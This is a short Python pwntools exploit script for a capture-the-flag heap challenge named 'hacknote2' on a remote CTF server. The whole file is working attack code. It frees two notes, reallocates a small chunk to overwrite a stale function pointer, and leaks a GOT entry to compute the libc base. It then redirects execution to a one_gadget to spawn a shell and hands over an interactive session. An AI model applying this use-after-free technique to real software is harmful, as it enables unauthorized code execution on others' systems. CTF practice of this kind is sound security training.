#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10139)
#r = process('./hacknote2')

read_offset = 0xf7220
read_got = 0x602040
print_note_context = 0x400886
binsh = 0x18cd17 
one_gadget_offset = 0xf0274 

def add_note(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(content)

def del_note(index):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(index))


def print_note(index):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(index))


add_note(0x30, "A"*0x8)
add_note(0x30, "A"*0x8)

del_note(0)
del_note(1)


add_note(0x10, p64(print_note_context) + p64(read_got))

print_note(0)
r.recvuntil(':')

libc = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00')) - read_offset

del_note(2)
print "libc:", hex(libc)

raw_input('#')
add_note(0x10, p64(libc + one_gadget_offset)+ p64(0))
print_note(0)

r.interactive()
